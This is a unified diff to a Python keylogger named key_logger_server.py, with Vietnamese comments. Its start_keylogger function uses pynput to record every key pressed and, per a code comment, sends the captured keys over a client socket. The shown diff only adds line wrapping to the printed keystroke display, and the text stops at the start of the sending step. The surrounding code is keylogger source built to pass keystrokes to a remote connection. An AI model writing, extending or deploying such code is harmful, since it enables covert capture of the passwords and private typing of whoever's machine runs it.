@@ -1,8 +1,10 @@
+# key_logger_server.py
 from pynput import keyboard
 
 def start_keylogger(client_socket):
     # Biến để lưu trữ các ký tự đã nhấn
     keys_pressed = ""
+    MAX_LINE_LENGTH = 50  # Độ dài dòng tối đa trước khi tự động xuống dòng
 
     def on_press(key):
         nonlocal keys_pressed  # Sử dụng biến keys_pressed trong phạm vi hàm
@@ -21,7 +23,12 @@ def start_keylogger(client_socket):
         else:
             # Cập nhật chuỗi ký tự đã nhấn và in ra trên cùng một dòng
             keys_pressed += key_str
-            print(f'\rKeys pressed: {keys_pressed}', end='')
+            
+            # Nếu chuỗi ký tự quá dài, xuống dòng mới mà không lặp lại ký tự
+            if len(keys_pressed) > MAX_LINE_LENGTH:
+                print(f'\rKeys pressed: {keys_pressed[:MAX_LINE_LENGTH]}')  # In phần đầu của dòng
+                keys_pressed = keys_pressed[MAX_LINE_LENGTH:]  # Lưu phần còn lại để in tiếp
+            print(f'\rKeys pressed: {keys_pressed}', end='')  # In ra trên cùng một dòng
 
         # Gửi dữ liệu phím nhấn qua client_socket
         try:
